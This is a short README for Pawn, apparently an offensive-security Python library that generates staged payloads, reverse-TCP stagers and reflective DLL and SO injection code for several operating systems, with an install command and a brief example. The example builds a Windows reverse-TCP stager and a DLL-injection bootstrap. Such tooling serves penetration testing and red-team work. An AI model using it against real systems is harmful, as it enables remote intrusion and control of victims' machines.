# Pawn

Pawn is a collection of Python techniques used for crafting, manipulating and injecting payloads.

## Features

* Support for `Windows`, `macOS`, `Linux` and `Apple iOS`.
* Support for such techniques like `Reflective DLL Injection` and `SO injection`.
* Can generate stage0, stage1 and dynamic extensions for Pwny.

## Installation

```
pip3 install git+https://github.com/EntySec/Pawn
```

## Examples

Example of preparing stage0 and stage1 (which is DLL) for Windows x86.

```python
from pawn.windows.x86 import ReverseTCP, Bootstrap

stage0 = ReverseTCP().generate_reverse_tcp()
stage1 = Bootstrap().inject_dll("/tmp/pwny.dll")

print(len(stage0), len(stage1))
```

## Special Thanks

* Some parts of **Windows assembly code** were ported from free open-source project [Metasploit Framework](https://github.com/rapid7/metasploit-framework).
